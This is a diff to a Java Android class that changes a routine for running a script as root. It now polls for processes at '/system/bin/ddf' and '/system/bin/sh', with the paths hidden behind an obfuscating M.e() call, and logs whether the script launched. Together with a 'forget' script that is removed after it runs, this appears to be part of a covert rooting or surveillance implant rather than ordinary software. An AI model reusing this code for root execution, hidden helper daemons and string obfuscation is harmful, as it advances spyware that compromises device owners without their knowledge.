@@ -254,8 +254,32 @@ public class Execute {
 
 		if (Root.createScript("e", script) == true) {
 			try {
-				Process localProcess = Runtime.getRuntime().exec(filename);
-				return true;
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(executeRootAndForgetScript),executing " + filename);
+				}
+				Runtime.getRuntime().exec(filename);
+				String pidDdf=null;
+				String pidSh=null;
+				int test=10;
+				do {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + ".");
+					}
+					pidDdf=Utils.pidOf(M.e("/system/bin/ddf"));
+					pidSh=Utils.pidOf(M.e("/system/bin/sh"));
+					Utils.sleep(500);
+				}while((pidDdf==null || pidSh==null) && test-->0);
+
+				if(pidDdf!=null &&  pidSh!=null){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(executeRootAndForgetScript),ok script lunched ");
+					}
+					return true;
+				}else{
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(executeRootAndForgetScript),script not lunched");
+					}
+				}
 			} catch (Exception e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
@@ -264,7 +288,6 @@ public class Execute {
 				Root.removeScript("e");
 			}
 		}
-
 		return false;
 	}
 
